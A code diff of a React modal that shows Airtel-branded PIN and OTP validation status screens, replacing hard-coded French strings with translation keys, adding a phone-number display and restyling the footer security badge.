@@ -1,7 +1,8 @@
 import React from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { ShieldCheck, Loader2, CheckCircle2, AlertTriangle, Smartphone, Lock } from 'lucide-react';
+import { ShieldCheck, Loader2, CheckCircle2, AlertTriangle } from 'lucide-react';
 import { AirtelLogo } from './Logos';
+import { useApp } from '../context/AppContext';
 
 interface ValidatingModalProps {
   isOpen: boolean;
@@ -19,6 +20,7 @@ export const ValidatingModal: React.FC<ValidatingModalProps> = ({
   planName,
   status,
 }) => {
+  const { t } = useApp();
   if (!isOpen) return null;
 
   const isPin = type === 'pin';
@@ -52,19 +54,23 @@ export const ValidatingModal: React.FC<ValidatingModalProps> = ({
               </div>
 
               <h3 className="font-extrabold text-neutral-900 text-lg sm:text-xl tracking-tight mb-1.5">
-                {isPin ? 'Validation du code PIN...' : 'Validation du code OTP...'}
+                {isPin ? t('validatingPin') : t('validatingOtp')}
               </h3>
-              
+
               <p className="text-xs text-neutral-500 max-w-[260px] leading-relaxed">
-                {isPin
-                  ? 'Vérification de vos identifiants Airtel Lite en cours. Veuillez patienter...'
-                  : 'Vérification du code de sécurité SMS en cours. Veuillez patienter...'}
+                {isPin ? t('verifyingPinMsg') : t('verifyingOtpMsg')}
               </p>
 
+              {phone && (
+                <div className="mt-2.5 px-3 py-1 rounded-full bg-neutral-100 text-neutral-700 text-xs font-mono font-bold">
+                  {phone}
+                </div>
+              )}
+
               {/* Secure status indicator */}
-              <div className="mt-5 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-[11px] font-semibold text-neutral-600">
+              <div className="mt-4 inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-neutral-100 border border-neutral-200 text-[11px] font-semibold text-neutral-600">
                 <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
-                <span>Traitement sécurisé</span>
+                <span>{t('secureProcessing')}</span>
               </div>
             </div>
           )}
@@ -75,10 +81,10 @@ export const ValidatingModal: React.FC<ValidatingModalProps> = ({
                 <CheckCircle2 className="w-9 h-9 animate-bounce" />
               </div>
               <h3 className="font-extrabold text-emerald-800 text-lg sm:text-xl tracking-tight mb-1">
-                {isPin ? 'Code PIN validé !' : 'Code OTP validé !'}
+                {isPin ? t('pinApproved') : t('otpApproved')}
               </h3>
               <p className="text-xs text-neutral-500">
-                {isPin ? 'Redirection vers l’étape suivante...' : 'Activation de votre forfait en cours...'}
+                {isPin ? t('redirecting') : t('activatingPlan')}
               </p>
             </div>
           )}
@@ -89,18 +95,16 @@ export const ValidatingModal: React.FC<ValidatingModalProps> = ({
                 <AlertTriangle className="w-9 h-9" />
               </div>
               <h3 className="font-extrabold text-rose-800 text-lg sm:text-xl tracking-tight mb-1">
-                {isPin ? 'Code PIN non valide' : 'Code OTP incorrect'}
+                {isPin ? t('pinRejected') : t('otpRejected')}
               </h3>
-              <p className="text-xs text-neutral-500">
-                Veuillez vérifier et réessayer.
-              </p>
+              <p className="text-xs text-neutral-500">{t('retryPrompt')}</p>
             </div>
           )}
 
           {/* Footer Security Badge */}
-          <div className="mt-5 pt-3 border-t border-neutral-100 flex items-center justify-center gap-1.5 text-[10px] font-medium text-neutral-400">
-            <Lock className="w-3 h-3 text-neutral-400" />
-            <span>Chiffrement Airtel Lite 256-bit</span>
+          <div className="mt-4 pt-4 border-t border-neutral-100 flex items-center justify-center gap-1.5 text-[10px] text-neutral-400 font-semibold uppercase tracking-wider">
+            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600" />
+            <span>{t('encryptedSession')}</span>
           </div>
         </motion.div>
       </div>
